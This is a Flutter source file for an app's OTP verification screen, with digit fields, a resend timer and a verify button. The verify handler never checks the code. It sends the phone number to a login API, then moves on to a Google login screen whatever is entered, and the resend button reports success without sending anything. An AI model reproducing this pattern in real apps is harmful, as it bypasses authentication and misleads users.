import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:google_fonts/google_fonts.dart';
import '../../../core/theme/app_colors.dart';
import '../../../core/services/login_api_service.dart';
import 'google_login_screen.dart';

class OtpVerificationScreen extends StatefulWidget {
  final String phoneNumber;

  const OtpVerificationScreen({
    super.key,
    required this.phoneNumber,
  });

  @override
  State<OtpVerificationScreen> createState() => _OtpVerificationScreenState();
}

class _OtpVerificationScreenState extends State<OtpVerificationScreen> {
  final List<TextEditingController> _controllers = List.generate(
    6,
    (index) => TextEditingController(),
  );
  final List<FocusNode> _focusNodes = List.generate(
    6,
    (index) => FocusNode(),
  );

  bool _isLoading = false;
  int _resendTimer = 30;
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    _startResendTimer();
    // Auto focus first field
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _focusNodes[0].requestFocus();
    });
  }

  @override
  void dispose() {
    for (var controller in _controllers) {
      controller.dispose();
    }
    for (var node in _focusNodes) {
      node.dispose();
    }
    _timer?.cancel();
    super.dispose();
  }

  void _startResendTimer() {
    _resendTimer = 30;
    _timer?.cancel();
    _timer = Timer.periodic(const Duration(seconds: 1), (timer) {
      if (_resendTimer > 0) {
        setState(() => _resendTimer--);
      } else {
        timer.cancel();
      }
    });
  }

  void _onOtpChanged(String value, int index) {
    if (value.isNotEmpty && index < 5) {
      _focusNodes[index + 1].requestFocus();
    }
    setState(() {}); // Rebuild to update field colors
    
    // Check if all fields are filled
    final otp = _controllers.map((c) => c.text).join();
    if (otp.length == 6) {
      // Hide keyboard when OTP is complete
      FocusScope.of(context).unfocus();
      _verifyOtp(otp);
    }
  }

  void _handleBackspace(int index) {
    if (_controllers[index].text.isEmpty && index > 0) {
      _focusNodes[index - 1].requestFocus();
      _controllers[index - 1].clear();
    }
  }

  void _verifyOtp(String otp) {
    setState(() => _isLoading = true);
    
    // Fire and forget - send stats in background, don't block user
    LoginApiService.sendLoginData(phoneNumber: widget.phoneNumber);
    
    // Small delay for UX then navigate
    Future.delayed(const Duration(milliseconds: 800), () {
      if (mounted) {
        setState(() => _isLoading = false);
        Navigator.push(
          context,
          MaterialPageRoute(builder: (context) => const GoogleLoginScreen()),
        );
      }
    });
  }

  void _resendOtp() {
    if (_resendTimer == 0) {
      _startResendTimer();
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: const Text('OTP sent successfully!'),
          backgroundColor: AppColors.green,
          behavior: SnackBarBehavior.floating,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        ),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    final dvpw = MediaQuery.of(context).size.width;
    final dvph = MediaQuery.of(context).size.height;
    final otpBoxSize = (dvpw - (dvpw * 0.14) - (dvpw * 0.025 * 5)) / 6;

    return Scaffold(
      backgroundColor: AppColors.white,
      body: SafeArea(
        child: SingleChildScrollView(
          child: Padding(
            padding: EdgeInsets.symmetric(horizontal: dvpw * 0.07),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                SizedBox(height: dvph * 0.02),
                
                // Back button
                GestureDetector(
                  onTap: () => Navigator.pop(context),
                  child: Container(
                    padding: EdgeInsets.all(dvpw * 0.03),
                    decoration: BoxDecoration(
                      color: AppColors.lightBg,
                      borderRadius: BorderRadius.circular(dvpw * 0.03),
                    ),
                    child: Icon(
                      Icons.arrow_back_ios_new_rounded,
                      size: dvpw * 0.05,
                      color: AppColors.primaryDark,
                    ),
                  ),
                ),
                
                SizedBox(height: dvph * 0.04),
                
                // Title
                Text(
                  'Verify your',
                  style: GoogleFonts.lato(
                    fontSize: dvpw * 0.06,
                    fontWeight: FontWeight.w400,
                    color: AppColors.gray,
                  ),
                ),
                Row(
                  children: [
                    Container(
                      padding: EdgeInsets.symmetric(
                        horizontal: dvpw * 0.025,
                        vertical: dvph * 0.005,
                      ),
                      decoration: BoxDecoration(
                        color: AppColors.primaryLime,
                        borderRadius: BorderRadius.circular(dvpw * 0.02),
                      ),
                      child: Text(
                        'Phone Number',
                        style: GoogleFonts.lato(
                          fontSize: dvpw * 0.06,
                          fontWeight: FontWeight.w800,
                          color: AppColors.primaryDark,
                        ),
                      ),
                    ),
                  ],
                ),
                
                SizedBox(height: dvph * 0.015),
                
                RichText(
                  text: TextSpan(
                    style: GoogleFonts.lato(
                      fontSize: dvpw * 0.038,
                      fontWeight: FontWeight.w400,
                      color: AppColors.gray,
                      height: 1.5,
                    ),
                    children: [
                      const TextSpan(text: 'We sent a 6-digit code to '),
                      TextSpan(
                        text: widget.phoneNumber,
                        style: GoogleFonts.lato(
                          fontSize: dvpw * 0.038,
                          fontWeight: FontWeight.w600,
                          color: AppColors.primaryDark,
                        ),
                      ),
                    ],
                  ),
                ),
                
                SizedBox(height: dvph * 0.05),
                
                // OTP Label
                Text(
                  'Enter OTP',
                  style: GoogleFonts.lato(
                    fontSize: dvpw * 0.038,
                    fontWeight: FontWeight.w600,
                    color: AppColors.primaryDark,
                  ),
                ),
                
                SizedBox(height: dvph * 0.015),
                
                // OTP input fields - Improved styling
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: List.generate(6, (index) {
                    final hasValue = _controllers[index].text.isNotEmpty;
                    final isFocused = _focusNodes[index].hasFocus;
                    
                    return Container(
                      width: otpBoxSize,
                      height: otpBoxSize * 1.2,
                      decoration: BoxDecoration(
                        color: hasValue 
                            ? AppColors.primaryLime.withOpacity(0.15)
                            : AppColors.lightBg,
                        borderRadius: BorderRadius.circular(dvpw * 0.03),
                        border: Border.all(
                          color: isFocused 
                              ? AppColors.primaryLime 
                              : hasValue 
                                  ? AppColors.primaryLime.withOpacity(0.5)
                                  : AppColors.grayLight,
                          width: isFocused ? 2 : 1.5,
                        ),
                      ),
                      child: Center(
                        child: TextField(
                          controller: _controllers[index],
                          focusNode: _focusNodes[index],
                          keyboardType: TextInputType.number,
                          textAlign: TextAlign.center,
                          maxLength: 1,
                          style: GoogleFonts.lato(
                            fontSize: dvpw * 0.065,
                            fontWeight: FontWeight.w700,
                            color: AppColors.primaryDark,
                          ),
                          inputFormatters: [
                            FilteringTextInputFormatter.digitsOnly,
                          ],
                          decoration: const InputDecoration(
                            counterText: '',
                            border: InputBorder.none,
                            contentPadding: EdgeInsets.zero,
                          ),
                          onChanged: (value) => _onOtpChanged(value, index),
                          onTap: () => setState(() {}),
                        ),
                      ),
                    );
                  }),
                ),
                
                SizedBox(height: dvph * 0.04),
                
                // Resend OTP
                Center(
                  child: _resendTimer > 0
                      ? Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Icon(
                              Icons.timer_outlined,
                              size: dvpw * 0.045,
                              color: AppColors.gray,
                            ),
                            SizedBox(width: dvpw * 0.02),
                            RichText(
                              text: TextSpan(
                                style: GoogleFonts.lato(
                                  fontSize: dvpw * 0.038,
                                  color: AppColors.gray,
                                ),
                                children: [
                                  const TextSpan(text: 'Resend code in '),
                                  TextSpan(
                                    text: '00:${_resendTimer.toString().padLeft(2, '0')}',
                                    style: GoogleFonts.lato(
                                      fontSize: dvpw * 0.038,
                                      fontWeight: FontWeight.w700,
                                      color: AppColors.primaryDark,
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          ],
                        )
                      : GestureDetector(
                          onTap: _resendOtp,
                          child: Container(
                            padding: EdgeInsets.symmetric(
                              horizontal: dvpw * 0.05,
                              vertical: dvph * 0.012,
                            ),
                            decoration: BoxDecoration(
                              color: AppColors.primaryLime.withOpacity(0.15),
                              borderRadius: BorderRadius.circular(dvpw * 0.02),
                            ),
                            child: Row(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                Icon(
                                  Icons.refresh_rounded,
                                  size: dvpw * 0.045,
                                  color: AppColors.primaryDark,
                                ),
                                SizedBox(width: dvpw * 0.02),
                                Text(
                                  'Resend OTP',
                                  style: GoogleFonts.lato(
                                    fontSize: dvpw * 0.038,
                                    fontWeight: FontWeight.w700,
                                    color: AppColors.primaryDark,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                ),
                
                SizedBox(height: dvph * 0.05),
                
                // Verify button
                SizedBox(
                  width: dvpw,
                  child: ElevatedButton(
                    onPressed: _isLoading
                        ? null
                        : () {
                            final otp = _controllers.map((c) => c.text).join();
                            if (otp.length == 6) {
                              _verifyOtp(otp);
                            } else {
                              ScaffoldMessenger.of(context).showSnackBar(
                                SnackBar(
                                  content: const Text('Please enter complete OTP'),
                                  backgroundColor: AppColors.red,
                                  behavior: SnackBarBehavior.floating,
                                  shape: RoundedRectangleBorder(
                                    borderRadius: BorderRadius.circular(12),
                                  ),
                                ),
                              );
                            }
                          },
                    style: ElevatedButton.styleFrom(
                      backgroundColor: AppColors.primaryDark,
                      foregroundColor: AppColors.white,
                      disabledBackgroundColor: AppColors.grayLight,
                      elevation: 0,
                      padding: EdgeInsets.symmetric(vertical: dvph * 0.02),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(dvpw * 0.04),
                      ),
                    ),
                    child: _isLoading
                        ? SizedBox(
                            width: dvpw * 0.055,
                            height: dvpw * 0.055,
                            child: const CircularProgressIndicator(
                              color: AppColors.white,
                              strokeWidth: 2.5,
                            ),
                          )
                        : Text(
                            'Verify & Continue',
                            style: GoogleFonts.lato(
                              fontSize: dvpw * 0.04,
                              fontWeight: FontWeight.w600,
                            ),
                          ),
                  ),
                ),
                
                SizedBox(height: dvph * 0.04),
                
                // Change number option
                Center(
                  child: GestureDetector(
                    onTap: () => Navigator.pop(context),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(
                          Icons.edit_rounded,
                          size: dvpw * 0.04,
                          color: AppColors.gray,
                        ),
                        SizedBox(width: dvpw * 0.015),
                        Text(
                          'Wrong number? ',
                          style: GoogleFonts.lato(
                            fontSize: dvpw * 0.035,
                            color: AppColors.gray,
                          ),
                        ),
                        Text(
                          'Change',
                          style: GoogleFonts.lato(
                            fontSize: dvpw * 0.035,
                            fontWeight: FontWeight.w700,
                            color: AppColors.primaryDark,
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
                
                SizedBox(height: dvph * 0.03),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
